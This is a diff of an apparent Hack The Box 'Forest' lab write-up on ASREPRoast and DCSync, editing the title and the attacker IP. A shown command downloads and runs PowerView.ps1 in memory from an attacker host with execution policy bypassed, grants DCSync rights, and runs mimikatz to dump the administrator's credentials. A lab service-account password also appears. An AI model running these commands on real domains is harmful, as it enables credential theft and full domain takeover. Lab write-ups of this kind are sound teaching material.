@@ -1,4 +1,4 @@
-## Forest DC box ,  ASREPRoast exploit for user and DCsYNC attack for root
+## Forest DC box, ASREPRoast exploit for user and DCSync attack for root
 
 This box is a DC windows machine, and i learned a lot about DC. 
 
@@ -438,7 +438,7 @@ $username = '.\svc-alfresco';$password = 's3rvice';$securePassword = ConvertTo-S
 Here we use RunAs and we execute a dcs.bat file which contains :
 
 ```
-powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.17/PowerView.ps1');Add-ObjectACL -PrincipalIdentity svc-alfresco -Rights DCSync" && C:\windows\system32\spool\drivers\color\mimikatz.exe "lsadump::dcsync /domain:htb.local /user:administrator" exit
+powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.x/PowerView.ps1');Add-ObjectACL -PrincipalIdentity svc-alfresco -Rights DCSync" && C:\windows\system32\spool\drivers\color\mimikatz.exe "lsadump::dcsync /domain:htb.local /user:administrator" exit
 ```
 
 Here powershell import powerview.ps1 in the memory and add the "DCSync" like : Add-ObjectACL -PrincipalIdentity svc-alfresco -Rights DCSync
